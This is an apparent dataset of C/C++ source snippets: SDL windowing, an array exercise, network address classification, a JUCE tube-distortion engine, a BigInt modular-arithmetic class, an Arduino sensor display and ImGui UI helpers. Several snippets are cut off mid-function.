    "#include \"../Header/sdl_requests.h\"\n#include <SDL2/SDL.h>\n\nstatic SDL_Window* window;\nstatic SDL_GLContext glContext;\nstatic bool isCloseRequested = false;\n\nbool SDLGetIsCloseRequested()\n{\n  return isCloseRequested;\n}\n\nvoid SDLSetIsCloseRequested(bool value)\n{\n  isCloseRequested = value;\n}\n\nvoid SDLCreateWindow(const char* title, int x, int y, int width, int height, bool fullscreen)\n{\n  int mode = 0;\n\n  if (fullscreen)\n    mode = SDL_WINDOW_FULLSCREEN;\n\n  window = SDL_CreateWindow(title, SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, width, height,\n                            SDL_WINDOW_OPENGL | mode);\n  glContext = SDL_GL_CreateContext(window);\n}\n\nvoid SDLSetWindowFullscreen(bool value)\n{\n  int mode = 0;\n  if (value)\n    mode = SDL_WINDOW_FULLSCREEN;\n  else\n    mode = 0;\n\n  SDL_SetWindowFullscreen(window, mode);\n}\n\nvoid SDLSwapBuffers()\n{\n  SDL_GL_SwapWindow(window);\n}\n\nvoid SDLDestroyWindow()\n{\n  SDL_GL_DeleteContext(glContext);\n  SDL_DestroyWindow(window);\n}\n\nvoid SDLSetMousePosition(int x, int y)\n{\n  SDL_WarpMouseInWindow(window, x, y);\n}\n",
    "#include<iostream>\n#include<climits>\nusing namespace std;\n\nint findSecondLargest(int arr[], int n) {\n    if (n < 2) {\n        cout << \"Array must have atleast 2 elements.\" << endl;\n        return INT_MIN;\n    }\n\n    int largest = INT_MIN, secondLargest = INT_MIN;\n\n    for (int i = 0; i < n; i++) {\n        if (arr[i] > largest) {\n            secondLargest = largest;\n            largest = arr[i];\n        }\n        else if (arr[i] > secondLargest && arr[i] != largest) {\n            secondLargest = arr[i];\n        }\n    }\n\n    if (secondLargest == INT_MIN) {\n        cout << \"There is no distinct second largest element.\" << endl;\n        return INT_MIN;\n    }\n\n    return secondLargest;\n}\n\nint main() {\n    int n;\n    cout << \"Enter the size of the array: \";\n    cin >> n;\n\n    if (n <= 0) {\n        cout << \"Array size must be positive.\" << endl;\n        return 0;\n    }\n\n    int arr[n];\n    cout << \"\\nEnter the elements of the array:\" << endl;\n    for (int i = 0; i < n; i++) {\n        cout << \"\\nEnter\" << \"[\" << i << \"]\" << \"element of the array: \";\n        cin >> arr[i];\n    }\n\n    cout << \"Given Array: \";\n    for (int i = 0; i < n; i++) {\n        cout << arr[i] << \" \";\n    }\n\n    int result = findSecondLargest(arr, n);\n    if (result != INT_MIN) {\n        cout << \"\\nThe second Largest Element: \" << result << endl;\n    }\n\n    return 0;\n}",
    "/**\n * @file src/network.cpp\n * @brief todo\n */\n#include \"network.h\"\n#include \"config.h\"\n#include \"logging.h\"\n#include \"utility.h\"\n#include <algorithm>\n\nusing namespace std::literals;\n\nnamespace ip = boost::asio::ip;\n\nnamespace net {\n  std::vector<ip::network_v4> pc_ips_v4 {\n    ip::make_network_v4(\"127.0.0.0/8\"sv),\n  };\n  std::vector<ip::network_v4> lan_ips_v4 {\n    ip::make_network_v4(\"192.168.0.0/16\"sv),\n    ip::make_network_v4(\"172.16.0.0/12\"sv),\n    ip::make_network_v4(\"10.0.0.0/8\"sv),\n    ip::make_network_v4(\"100.64.0.0/10\"sv),\n    ip::make_network_v4(\"169.254.0.0/16\"sv),\n  };\n\n  std::vector<ip::network_v6> pc_ips_v6 {\n    ip::make_network_v6(\"::1/128\"sv),\n  };\n  std::vector<ip::network_v6> lan_ips_v6 {\n    ip::make_network_v6(\"fc00::/7\"sv),\n    ip::make_network_v6(\"fe80::/64\"sv),\n  };\n\n  net_e\n  from_enum_string(const std::string_view &view) {\n    if (view == \"wan\") {\n      return WAN;\n    }\n    if (view == \"lan\") {\n      return LAN;\n    }\n\n    return PC;\n  }\n\n  net_e\n  from_address(const std::string_view &view) {\n    auto addr = normalize_address(ip::make_address(view));\n\n    if (addr.is_v6()) {\n      for (auto &range : pc_ips_v6) {\n        if (range.hosts().find(addr.to_v6()) != range.hosts().end()) {\n          return PC;\n        }\n      }\n\n      for (auto &range : lan_ips_v6) {\n        if (range.hosts().find(addr.to_v6()) != range.hosts().end()) {\n          return LAN;\n        }\n      }\n    }\n    else {\n      for (auto &range : pc_ips_v4) {\n        if (range.hosts().find(addr.to_v4()) != range.hosts().end()) {\n          return PC;\n        }\n      }\n\n      for (auto &range : lan_ips_v4) {\n        if (range.hosts().find(addr.to_v4()) != range.hosts().end()) {\n          return LAN;\n        }\n      }\n    }\n\n    return WAN;\n  }\n\n  std::string_view\n  to_enum_string(net_e net) {\n    switch (net) {\n      case PC:\n        return \"pc\"sv;\n      case LAN:\n        return \"lan\"sv;\n      case WAN:\n        return \"wan\"sv;\n    }\n\n    // avoid warning\n    return \"wan\"sv;\n  }\n\n  /**\n   * @brief Returns the `af_e` enum value for the `address_family` config option value.\n   * @param view The config option value.\n   * @return The `af_e` enum value.\n   */\n  af_e\n  af_from_enum_string(const std::string_view &view) {\n    if (view == \"ipv4\") {\n      return IPV4;\n    }\n    if (view == \"both\") {\n      return BOTH;\n    }\n\n    // avoid warning\n    return BOTH;\n  }\n\n  /**\n   * @brief Returns the wildcard binding address for a given address family.\n   * @param af Address family.\n   * @return Normalized address.\n   */\n  std::string_view\n  af_to_any_address_string(af_e af) {\n    switch (af) {\n      case IPV4:\n        return \"0.0.0.0\"sv;\n      case BOTH:\n        return \"::\"sv;\n    }\n\n    // avoid warning\n    return \"::\"sv;\n  }\n\n  /**\n   * @brief Converts an address to a normalized form.\n   * @details Normalization converts IPv4-mapped IPv6 addresses into IPv4 addresses.\n   * @param address The address to normalize.\n   * @return Normalized address.\n   */\n  boost::asio::ip::address\n  normalize_address(boost::asio::ip::address address) {\n    // Convert IPv6-mapped IPv4 addresses into regular IPv4 addresses\n    if (address.is_v6()) {\n      auto v6 = address.to_v6();\n      if (v6.is_v4_mapped()) {\n        return boost::asio::ip::make_address_v4(boost::asio::ip::v4_mapped, v6);\n      }\n    }\n\n    return address;\n  }\n\n  /**\n   * @brief Returns the given address in normalized string form.\n   * @details Normalization converts IPv4-mapped IPv6 addresses into IPv4 addresses.\n   * @param address The address to normalize.\n   * @return Normalized address in string form.\n   */\n  std::string\n  addr_to_normalized_string(boost::asio::ip::address address) {\n    return normalize_address(address).to_string();\n  }\n\n  /**\n   * @brief Returns the given address in a normalized form for in the host portion of a URL.\n   * @details Normalization converts IPv4-mapped IPv6 addresses into IPv4 addresses.\n   * @param address The address to normalize and escape.\n   * @return Normalized address in URL-escaped string.\n   */\n  std::string\n  addr_to_url_escaped_string(boost::asio::ip::address address) {\n    address = normalize_address(address);\n    if (address.is_v6()) {\n      return \"[\"s + address.to_string() + ']';\n    }\n    else {\n      return address.to_string();\n    }\n  }\n\n  /**\n   * @brief Returns the encryption mode for the given remote endpoint address.\n   * @param address The address used to look up the desired encryption mode.\n   * @return The WAN or LAN encryption mode, based on the provided address.\n   */\n  int\n  encryption_mode_for_address(boost::asio::ip::address address) {\n    auto nettype = net::from_address(address.to_string());\n    if (nettype == net::net_e::PC || nettype == net::net_e::LAN) {\n      return config::stream.lan_encryption_mode;\n    }\n    else {\n      return config::stream.wan_encryption_mode;\n    }\n  }\n\n  host_t\n  host_create(af_e af, ENetAddress &addr, std::size_t peers, std::uint16_t port) {\n    static std::once_flag enet_init_flag;\n ",
    "// distortionEngine.cpp\n\n#include \"DistortionEngine.h\"\n\nvoid DistortionEngine::prepare(const juce::dsp::ProcessSpec& spec, int oversamplingFactor)\n{\n  oversampler = std::make_unique<juce::dsp::Oversampling<float>>\n    ((int)spec.numChannels,\n      (uint32_t)oversamplingFactor,\n      juce::dsp::Oversampling<float>::filterHalfBandPolyphaseIIR);\n\n  oversampler->initProcessing((size_t)spec.maximumBlockSize);\n\n  toneStack.prepare(spec);\n\n  // Prepare the highPassFilter\u2019s internal states\n  highPassFilter.prepare(spec);\n  highPassFilter.reset();\n  *highPassFilter.state = *juce::dsp::IIR::Coefficients<float>::makeHighPass(spec.sampleRate, 20.0f);\n\n  // Pre-allocate the dryBuffer at the max size,\n  // so we can re-use it without new allocations:\n  dryBuffer.setSize((int)spec.numChannels, (int)spec.maximumBlockSize);\n}\n\nvoid DistortionEngine::reset()\n{\n  if (oversampler)\n    oversampler->reset();\n\n  toneStack.reset();\n  highPassFilter.reset();\n}\n\nvoid DistortionEngine::encodeToMS(juce::AudioBuffer<float>& buffer)\n{\n  const int numChannels = buffer.getNumChannels();\n  if (numChannels < 2) return;\n\n  int numSamples = buffer.getNumSamples();\n  for (int i = 0; i < numSamples; ++i)\n  {\n    float L = buffer.getSample(0, i);\n    float R = buffer.getSample(1, i);\n    float M = 0.5f * (L + R);\n    float S = 0.5f * (L - R);\n    buffer.setSample(0, i, M);\n    buffer.setSample(1, i, S);\n  }\n}\n\nvoid DistortionEngine::decodeFromMS(juce::AudioBuffer<float>& buffer)\n{\n  const int numChannels = buffer.getNumChannels();\n  if (numChannels < 2) return;\n\n  int numSamples = buffer.getNumSamples();\n  for (int i = 0; i < numSamples; ++i)\n  {\n    float M = buffer.getSample(0, i);\n    float S = buffer.getSample(1, i);\n\n    float L = M + S;\n    float R = M - S;\n\n    buffer.setSample(0, i, L);\n    buffer.setSample(1, i, R);\n  }\n}\n\nvoid DistortionEngine::applyTriodeStages(float sampleRate, juce::dsp::AudioBlock<float>& oversampledBlock,\n  float drive, float bias)\n{\n  // Stage 1 12AX7\n  KorenTriodeModel::processAudioBlock(\n    oversampledBlock,\n    /* gainVal   */ 0.3f,\n    /* bias      */ 0.0f,\n    /* drive     */ 1.0f + (drive * 60.0f),\n    /* G         */ 2.5e-3f,\n    /* mu        */ 100.0f,\n    /* C         */ 0.5f,\n    /* P         */ 1.5f,\n    /* B_plus    */ 200.0f,\n    /* Rp        */ 130000.0f\n    // maxIter + tol using defaults\n  );\n\n  // Stage 2 12AX7\n  KorenTriodeModel::processAudioBlock(\n    oversampledBlock,\n    /* gainVal   */ 0.3f,\n    /* bias      */  1.25f * bias,\n    /* drive     */ 1.0f + (drive * 40.0f),\n    /* G         */ 2.5e-3f,\n    /* mu        */ 100.0f,\n    /* C         */ 0.5f,\n    /* P         */ 1.5f,\n    /* B_plus    */ 300.0f,\n    /* Rp        */ 200000.0f\n  );\n\n  // Stage 3 12AT7\n  KorenTriodeModel::processAudioBlock(\n    oversampledBlock,\n    /* gainVal   */ drive * 0.65f,\n    /* bias      */ -1.35f * bias,\n    /* drive     */ 1.0f + (drive * 30.0f),\n    /* G         */ 3.5e-3f,\n    /* mu        */ 60.0f,\n    /* C         */ 0.5f,\n    /* P         */ 1.5f,\n    /* B_plus    */ 350.0f,\n    /* Rp        */ 160000.0f\n  );\n\n  // Stage 4 12AT7\n  KorenTriodeModel::processAudioBlock(\n    oversampledBlock,\n    /* gainVal   */ drive * 0.55f,\n    /* bias      */ 1.5f * bias,\n    /* drive     */ 1.0f + (drive * 30.0f),\n    /* G         */ 3.5e-3f,\n    /* mu        */ 60.0f,\n    /* C         */ 0.5f,\n    /* P         */ 1.5f,\n    /* B_plus    */ 400.0f,\n    /* Rp        */ 120000.0f\n  );\n\n  // Tone stack in between\n  toneStack.setDrive(drive);\n  toneStack.processAudioBlock(sampleRate, oversampledBlock);\n\n  // Stage 5 12AU7\n  KorenTriodeModel::processAudioBlock(\n    oversampledBlock,\n    /* gainVal   */ 0.5f,\n    /* bias      */ -1.25f * bias,\n    /* drive     */ 1.0f + (drive * 20.0f),\n    /* G         */ 7.0e-3f,\n    /* mu        */ 17.0f,\n    /* C         */ 0.5f,\n    /* P         */ 1.5f,\n    /* B_plus    */ 400.0f,\n    /* Rp        */ 150000.0f\n  );\n\n  juce::dsp::ProcessContextReplacing<float> context(oversampledBlock);\n  highPassFilter.process(context);\n}\n\n\nvoid DistortionEngine::processBlock(float sampleRate, juce::AudioBuffer<float>& buffer)\n{\n  // 1) Copy the input (dry) signal into dryBuffer\n  const int numChannels = buffer.getNumChannels();\n  const int numSamples = buffer.getNumSamples();\n\n  // We'll copy each channel\n  for (int ch = 0; ch < numChannels; ++ch)\n    dryBuffer.copyFrom(ch, 0, buffer, ch, 0, numSamples);\n\n  // 2) Convert to AudioBlock & oversample\n  juce::dsp::AudioBlock<float> block(buffer);\n  auto subset = block.getSubsetChannelBlock(0, juce::jmin(2, (int)block.getNumChannels()));\n  auto oversampledBlock = oversampler->processSamplesUp(subset);\n\n  // 3) Triode processing\n  applyTriodeStages(sampleRate, oversampledBlock, driveParam, biasParam);\n\n  // 4) Downsample\n  oversampler->processSamplesDown(subset);\n\n  // 5) Mix the result with the original DRY buffer\n  const float wetGain = mixParam;        // e.g. 0.0..1.0\n  const float dryGain = 1.0f - wetGain;\n\n  for (int ch = 0; ch < numChannels; ++ch)\n  {",
    "#include<stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include<iostream>\n#include <vector>\n#include<math.h>\n#include<string>\n#include <algorithm>\n#include<x86intrin.h>\n#include <cstring>\n#include <fstream>\n#define uint8_t unsigned char\n#define uint32_t unsigned int\n#define uint64_t unsigned long long\n\nusing namespace std;\nclass BigInt {\npublic:\n    static const uint64_t BASE = 0x100000000;\n    static const int SIZE = 8 ;\n    uint32_t P[SIZE]={0};\n    uint32_t R[SIZE] = {0};\n    uint32_t R2[SIZE] = {0};\n    uint32_t P_[SIZE] = {0};\n    uint32_t ZERO[SIZE] = {0};\n    uint32_t ONE[SIZE] = {1};\n    uint32_t TWO[SIZE] = {2};\n    uint32_t RES[SIZE] = {0};\n    uint32_t THREE[SIZE] = {3};\n\n    int P_bits = 0;\n    int R_bits = 0;\n\n    uint32_t pow2[32] = {1, 2, 4, 8, 16, 32, 64, 128, 256, 512,\n                         1024, 2048, 4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288,\n                         1048576, 2097152, 4194304, 8388608, 16777216, 33554432, 67108864, 134217728, 268435456, 536870912,\n                         1073741824, 2147483648};\npublic:\n    int getBits(const uint32_t a[SIZE])\n    {\n        for (int i = SIZE-1; i >= 0; i--)\n        {\n            if (a[i])\n                for (int j = 31; j >= 0; j--)\n                    if (a[i] & pow2[j])\n                        return i * 32 + j;\n        }\n\n        return 0;\n    }\n    \n    void exculid(uint32_t a[SIZE], uint32_t b[SIZE], uint32_t x[SIZE], uint32_t y[SIZE])\n    {\n        bool flag = false;\n        for (int i = 0; i < SIZE; i++)\n            if (b[i])\n            {\n                flag = true;\n                break;\n            }\n\n        if (!flag)\n        {\n            x[0] = 1;\n            y[0] = 0;\n            return;\n        }\n        uint32_t temp[SIZE] = {0};\n        divInternal(temp, a, b);\n        mulInternal(temp, b, temp);\n        subInternal(temp, a, temp);\n\n        exculid(b, temp, y, x);\n\n        uint32_t temp2[SIZE] = {0};\n        divInternal(temp2, a, b);\n        mulInternal(temp2, temp2, x);\n\n        if (isBigger(y, temp2))\n        {\n            subInternal(temp2, y, temp2);\n            modR(temp2, temp2);\n        }\n        else\n        {\n            subInternal(temp2, temp2, y);\n            modR(temp2, temp2);\n            subInternal(temp2, R, temp2);\n        }\n\n        for (int i = 0; i < SIZE; i++)\n            y[i] = temp2[i];\n    }\n    void gcd(uint32_t r0[SIZE], uint32_t a[SIZE], uint32_t b[SIZE])\n    {\n        memcpy(r0, a, SIZE * sizeof(uint32_t));\n        uint32_t r1[SIZE];\n        memcpy(r1, b, SIZE * sizeof(uint32_t));\n        \n        uint32_t r2[SIZE]={0};\n        uint32_t q[SIZE]={0};\n\n        \n        while(!isEqual(r1,ZERO)){\n            divInternal(q,r0,r1);\n            mulInternal(r2,r1,q);\n            subInternal(r2,r0,r2);\n            memcpy(r0,r1,SIZE*sizeof(uint32_t));\n            memcpy(r1,r2,SIZE*sizeof(uint32_t));\n        }\n\n\n    }\n    void gcd(__uint128_t a, __uint128_t b, __uint128_t &res)\n    {\n        while (b != 0)\n        {\n            __uint128_t temp = a % b;\n            a = b;\n            b = temp;\n        }\n        res = a;\n    }\n    BigInt ex_gcd(BigInt a, BigInt b, BigInt& x, BigInt& y) {\n        if (b.isEqual(b.RES,ZERO)) {\n            x = ONE;\n            y = ZERO;\n            // cout<<\"return\"<<endl;\n            return a;\n        }\n\n        BigInt d = ex_gcd(b, a % b, x, y);\n        BigInt temp = x;\n        x = y;\n        y = temp - (a / b) * y;\n        return d;\n    }\n    void resInit(const string &s);\n    void resInit(uint32_t res[SIZE]);\n    void removeLeadingZeros(string &s);\n    bool isBigger(uint32_t a[SIZE], uint32_t b[SIZE]);\n    bool isEqual(uint32_t a[SIZE], uint32_t b[SIZE]);\n    void strDiv2(string &s);\n    void strMul2(string &s);\n    void strAdd1(string &s);\n    void strToBi(uint32_t res[SIZE], string &s);\n    string biToStr(uint32_t res[SIZE]);\n    void addInternal(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void subInternal(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void mulInternal(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void divInternal(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modInternal(uint32_t res[SIZE], uint32_t a[SIZE]);\n    void modn(uint32_t res[SIZE], uint32_t a[SIZE],uint32_t N[SIZE]);//n\u4e3aP\u7684\u56e0\u5b50\n    void modAdd(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modSub(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modSub(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE],uint32_t n[SIZE]);\n    void modMul(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modPow(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modR(uint32_t res[SIZE], uint32_t a[SIZE]);\n    int mod_int(uint32_t a[SIZE],int n);\n    void divR(uint32_t res[SIZE], uint32_t a[SIZE+1]);\n    void modReduction(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n    void modMulMontgomery(uint32_t res[SIZE], uint32_t a[SIZE], uint32_t b[SIZE]);\n  ",
    "#include <Arduino.h>\n#include <Adafruit_BME280.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <Wire.h>\n\nAdafruit_BME280 bme;\nAdafruit_SSD1306 display(128, 64, &Wire, -1);\n\nconst unsigned char altitude_icon[] PROGMEM = {\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, \n\t0x18, 0x00, 0x00, 0x2c, 0x00, 0x02, 0x64, 0x00, 0x07, 0xc2, 0x00, 0x0d, 0x83, 0x00, 0x18, 0x01, \n\t0x80, 0x10, 0x00, 0x80, 0x20, 0x00, 0x40, 0x60, 0x00, 0x60, 0xff, 0xff, 0xf0, 0xff, 0xff, 0xf0, \n\t0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n};\n\nconst unsigned char humidity_icon[] PROGMEM = {\n  0x00, 0x60, 0x00, 0x00, 0xf0, 0x00, 0x01, 0x98, 0x00, 0x03, 0x0c, 0x00, 0x06, 0x06, 0x00, 0x0c, \n\t0x03, 0x00, 0x08, 0x01, 0x00, 0x10, 0x00, 0x80, 0x13, 0x80, 0x80, 0x32, 0x90, 0xc0, 0x23, 0xb0, \n\t0x40, 0x20, 0x20, 0x40, 0x20, 0x40, 0x40, 0x20, 0xdc, 0x40, 0x30, 0x94, 0xc0, 0x10, 0x1c, 0x80, \n\t0x18, 0x01, 0x80, 0x0c, 0x03, 0x00, 0x07, 0x0e, 0x00, 0x01, 0xf8, 0x00\n};\n\nconst unsigned char pressure_icon[] PROGMEM = {\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x07, 0xfe, 0x00, 0x0c, 0x63, 0x00, 0x12, \n\t0x06, 0x80, 0x20, 0x00, 0x40, 0x60, 0x00, 0x60, 0x72, 0x00, 0xe0, 0xc1, 0x00, 0x30, 0x81, 0xc0, \n\t0x10, 0x80, 0xf0, 0x10, 0xe0, 0xd0, 0x70, 0x80, 0x70, 0x10, 0x80, 0x00, 0x10, 0x40, 0x00, 0x20, \n\t0x70, 0x00, 0xe0, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n};\n\nconst unsigned char temperature_icon[] PROGMEM = {\n  0x00, 0x60, 0x00, 0x00, 0x90, 0x00, 0x01, 0x98, 0x00, 0x01, 0x08, 0x00, 0x01, 0x08, 0x00, 0x01, \n\t0x68, 0x00, 0x01, 0x68, 0x00, 0x01, 0x68, 0x00, 0x01, 0x68, 0x00, 0x01, 0x68, 0x00, 0x01, 0x68, \n\t0x00, 0x01, 0x68, 0x00, 0x03, 0x6c, 0x00, 0x02, 0x64, 0x00, 0x02, 0xf4, 0x00, 0x02, 0xf6, 0x00, \n\t0x02, 0xf4, 0x00, 0x02, 0x04, 0x00, 0x01, 0x98, 0x00, 0x00, 0xf0, 0x00\n};\n\nvoid setup() {\n  Serial.begin(9600);\n  bme.begin(0x76);\n  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);\n  pinMode(32, INPUT_PULLDOWN);\n}\n\nvoid loop() {\n  if (digitalRead(32) == HIGH) {\n    int uptime = millis() / 1000;\n    display.clearDisplay();\n    display.setTextColor(WHITE);\n    display.setCursor(5, 5);\n    display.setTextSize(2);\n    display.println(\"Sphere App\");\n    display.setCursor(5, 28);\n    display.setTextSize(1);\n    display.println(\"Uptime: \" + String(uptime) + \"s\");\n    display.display();\n    return;\n  }\n\n  int altitude = bme.readAltitude(1013.25);\n  int humidity = bme.readHumidity();\n  int pressure = bme.readPressure() / 100.0F;\n  int temperature = bme.readTemperature();\n\n  display.clearDisplay();\n  display.setTextColor(WHITE);\n\n  display.drawBitmap(0, 8, altitude_icon, 20, 20, WHITE);\n  display.setCursor(26, 14);\n  display.print(String(altitude) + \"m\");\n\n  display.drawBitmap(70, 8, humidity_icon, 20, 20, WHITE);\n  display.setCursor(96, 14);\n  display.print(String(humidity) + \"%\");\n\n  display.drawBitmap(0, 36, pressure_icon, 20, 20, WHITE);\n  display.setCursor(26, 42);\n  display.print(String(pressure) + \"hPa\");\n\n  display.drawBitmap(70, 36, temperature_icon, 20, 20, WHITE);\n  display.setCursor(96, 42);\n  display.print(String(temperature) + \"C\");\n\n  display.display();\n  delay(1000);\n}",
    "/*\n*\n*\tMegan Grass\n*\tDecember 14, 2024\n* \n*/\n\n#include \"app.h\"\n\nvoid Global_Application::Tooltip(String Tip)\n{\n\tImGui::SameLine(); ImGui::TextDisabled(\"(?)\");\n\tif (ImGui::BeginItemTooltip())\n\t{\n\t\tImGui::PushTextWrapPos(ImGui::GetFontSize() * 35.0f);\n\t\tImGui::TextUnformatted(Tip.c_str());\n\t\tImGui::PopTextWrapPos();\n\t\tImGui::EndTooltip();\n\t}\n}\n\nvoid Global_Application::TooltipOnHover(String Tip)\n{\n\tif (ImGui::IsItemHovered(ImGuiHoveredFlags_ForTooltip))\n\t{\n\t\tImGui::BeginTooltip();\n\t\tImGui::Text(Tip.c_str());\n\t\tImGui::EndTooltip();\n\t}\n}\n\nbool Global_Application::ScrollOnHover(void* Input, ImGuiDataType DataType, std::uintmax_t Step, std::uintmax_t Min, std::uintmax_t Max) const\n{\n\tif (ImGui::IsItemHovered())\n\t{\n\t\tImGui::SetItemKeyOwner(ImGuiKey_MouseWheelX);\n\t\tImGui::SetItemKeyOwner(ImGuiKey_MouseWheelY);\n\n\t\tif (Window->Device()->GetMouseDeltaZ() != 0.0f)\n\t\t{\n\t\t\tbool b_Add = false;\n\n\t\t\tif (Window->Device()->GetMouseDeltaZ() > 0.0f)\n\t\t\t{\n\t\t\t\tb_Add = true;\n\t\t\t}\n\n\t\t\tif (DataType == ImGuiDataType_S8)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(int8_t*)Input) { return false; }\n\t\t\t\t*(int8_t*)Input = std::clamp(b_Add ? *(int8_t*)Input += (int8_t)Step : *(int8_t*)Input -= (int8_t)Step, (int8_t)Min, (int8_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_U8)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(uint8_t*)Input) { return false; }\n\t\t\t\t*(uint8_t*)Input = std::clamp(b_Add ? *(uint8_t*)Input += (uint8_t)Step : *(uint8_t*)Input -= (uint8_t)Step, (uint8_t)Min, (uint8_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_S16)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(int16_t*)Input) { return false; }\n\t\t\t\t*(int16_t*)Input = std::clamp(b_Add ? *(int16_t*)Input += (int16_t)Step : *(int16_t*)Input -= (int16_t)Step, (int16_t)Min, (int16_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_U16)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(uint16_t*)Input) { return false; }\n\t\t\t\t*(uint16_t*)Input = std::clamp(b_Add ? *(uint16_t*)Input += (uint16_t)Step : *(uint16_t*)Input -= (uint16_t)Step, (uint16_t)Min, (uint16_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_S32)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(int32_t*)Input) { return false; }\n\t\t\t\t*(int32_t*)Input = std::clamp(b_Add ? *(int32_t*)Input += (int32_t)Step : *(int32_t*)Input -= (int32_t)Step, (int32_t)Min, (int32_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_U32)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(uint32_t*)Input) { return false; }\n\t\t\t\t*(uint32_t*)Input = std::clamp(b_Add ? *(uint32_t*)Input += (uint32_t)Step : *(uint32_t*)Input -= (uint32_t)Step, (uint32_t)Min, (uint32_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_S64)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(int64_t*)Input) { return false; }\n\t\t\t\t*(int64_t*)Input = std::clamp(b_Add ? *(int64_t*)Input += (int64_t)Step : *(int64_t*)Input -= (int64_t)Step, (int64_t)Min, (int64_t)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_U64)\n\t\t\t{\n\t\t\t\tif (!b_Add && !*(uint64_t*)Input) { return false; }\n\t\t\t\t*(uint64_t*)Input = std::clamp(b_Add ? *(uint64_t*)Input += Step : *(uint64_t*)Input -= Step, Min, Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_Bool)\n\t\t\t{\n\t\t\t\tif (!b_Add && *(bool*)Input == false) { return false; }\n\t\t\t\tb_Add ? *(bool*)Input = true : *(bool*)Input = false;\n\t\t\t}\n\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(50));\n\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nbool Global_Application::ScrollFloatOnHover(void* Input, ImGuiDataType DataType, double Step, double Min, double Max) const\n{\n\tif (ImGui::IsItemHovered())\n\t{\n\t\tImGui::SetItemKeyOwner(ImGuiKey_MouseWheelX);\n\t\tImGui::SetItemKeyOwner(ImGuiKey_MouseWheelY);\n\n\t\tif (Window->Device()->GetMouseDeltaZ() != 0.0f)\n\t\t{\n\t\t\tbool b_Add = false;\n\n\t\t\tif (Window->Device()->GetMouseDeltaZ() > 0.0f)\n\t\t\t{\n\t\t\t\tb_Add = true;\n\t\t\t}\n\n\t\t\tif (DataType == ImGuiDataType_Float)\n\t\t\t{\n\t\t\t\tif (!b_Add && *(float*)Input == 0.0f) { return false; }\n\t\t\t\t*(float*)Input = std::clamp(b_Add ? *(float*)Input += (float)Step : *(float*)Input -= (float)Step, (float)Min, (float)Max);\n\t\t\t}\n\t\t\telse if (DataType == ImGuiDataType_Double)\n\t\t\t{\n\t\t\t\tif (!b_Add && *(double*)Input == 0.0f) { return false; }\n\t\t\t\t*(double*)Input = std::clamp(b_Add ? *(double*)Input += Step : *(double*)Input -= Step, Min, Max);\n\t\t\t}\n\n\t\t\tstd::this_thread::sleep_for(std::chrono::milliseconds(50));\n\n\t\t\treturn true;\n\t\t}\n\t}\n\n\treturn false;\n}\n\nvoid Global_Application::AdjustWidthInput(std::uint16_t& Width)\n{\n\tstd::uint16_t MinWidth = 1;\n\tif (b_Raw4bpp || (m_Texture && Texture().GetDepth() == 4))\n\t{\n\t\tif (Width % 4)\n\t\t{\n\t\t\tWidth += 4 - (Width % 4);\n\t\t}\n\t\tMinWidth = 4;\n\t}\n\telse if (b_Raw8bpp || (m_Texture && Texture().GetDepth() == 8))\n\t{\n\t\tif (Width % 2)\n\t\t{\n\t\t\tWidth += 2 - (Width % 2);\n\t\t}\n\t\tMinWidth = 2;\n\t}\n\tWidth = std::clamp(Width, MinWidth, uint16_t(1024));\n}\n\nvoid Global_Application::AdjustHeightInput(std::uint16_t& Height)\n{\n\tstd::uint16_t MinHeight = 1;\n\tHeight = std::clamp(Height, MinHeight, uint16_t(512));\n}",
